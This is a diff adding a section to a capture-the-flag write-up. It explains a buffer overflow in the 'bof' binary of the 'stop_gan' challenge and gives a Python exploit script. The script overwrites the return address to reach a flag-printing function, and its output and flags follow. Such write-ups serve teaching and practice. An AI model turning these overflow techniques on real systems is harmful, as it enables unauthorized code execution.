@@ -75,3 +75,57 @@ quit
 ```
 
 **FLAG: CTF{Why_does_cauliflower_threaten_us}**
+
+`Controlling the buffer overflow in bof will trigger the 2nd flag.` In `bof` we can find the `local_flag` function which calls `print_file("flag1")`. It seems that we need to overwrite the return address with 0x0040084C, performing the buffer overflow.
+
+![local_flag](https://raw.githubusercontent.com/mfurga/google-ctf/master/stop_gan/local_flag.png)
+
+Exploit below:
+
+```python
+#!/usr/bin/env python2
+
+import socket
+import telnetlib
+from struct import pack
+
+def dd(n):
+  """Define double word in little-endian."""
+  return pack('<I', n)
+
+if __name__ == '__main__':
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+  s.connect(('buffer-overflow.ctfcompetition.com', 1337))
+  s.sendall('run\n')
+
+  payload = 'A' * (256 + 8)
+  payload += dd(0x0040084C)[:3]
+
+  s.sendall(payload + '\n')
+
+  t = telnetlib.Telnet()
+  t.sock = s
+  t.interact()
+```
+```bash
+> python exploit.py
+Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
+ Bonus flag for controlling the crash.
+
+Console commands: 
+run
+quit
+>>Inputs: run
+CTF{controlled_crash_causes_conditional_correspondence}
+Cauliflower systems never crash >>
+
+Console commands: 
+run
+quit
+>>
+```
+
+
+**FLAG: CTF{controlled_crash_causes_conditional_correspondence}**
